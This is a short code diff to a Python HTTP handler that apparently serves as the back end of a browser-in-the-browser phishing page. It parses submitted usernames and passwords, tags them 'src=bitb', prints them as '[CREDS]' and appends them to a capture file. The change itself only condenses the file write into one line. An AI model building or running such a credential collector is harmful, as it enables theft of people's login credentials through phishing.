@@ -24,8 +24,7 @@ class H(BaseHTTPRequestHandler):
             try:
                 d=json.loads(body)
                 line=f"[{ts()}]  user={d.get('user','?')!r}  pass={d.get('pass','?')!r}  src=bitb\n"
-                with open(CAUGHT,"a") as _f: _f.write(line)
-                print(f"[CREDS] {line.strip()}",flush=True)
+                open(CAUGHT,"a").write(line);print(f"[CREDS] {line.strip()}",flush=True)
             except: pass
         self.send_response(200);self._cors();self.send_header("Content-Length","0");self.end_headers()
 if __name__=="__main__":
